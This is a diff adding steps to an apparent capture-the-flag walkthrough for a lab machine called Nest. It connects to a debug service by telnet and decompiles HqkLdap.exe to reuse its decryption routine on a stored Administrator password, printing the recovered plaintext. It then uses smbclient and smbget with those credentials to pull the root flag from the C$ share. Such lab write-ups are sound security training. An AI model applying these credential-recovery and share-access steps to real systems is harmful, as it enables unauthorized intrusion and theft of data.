@@ -156,3 +156,45 @@ Important parts of the above are:
 - <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
 
 Also we got an .exe file and empty file(or seems to be)
+
+
+
+Then
+`$ telnet 10.10.10.178 `
+
+### Getting the debug password
+
+
+We get the info:
+```
+Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+```
+
+### Decompiling the HqkLdap.exe binary
+
+https://github.com/icsharpcode/ILSpy
+
+Download ILSpy on linux or windows to decompile the HqkLdap.exe
+binary. Then get the enc-dec algorithm (class CR).
+Copy-paste it into an online C# compiler (ideone is a good one).
+
+Add a Main function to print the
+`DS("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=")`
+
+the output is:
+XtH4nkS4Pl4y1nGX
+
+
+`$ smbclient //10.10.10.178/Users -U Administrator`
+
+enter the pass and then we find a `flag.txt - Shortcut.lnk`
+file.
+download it and `cat` it .
+We get the real dir of the Shortcut .
+
+finaly we type the following to get the root flag:
+`smbget smb://Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178/C$/Users/Administrator/Desktop/root.txt`
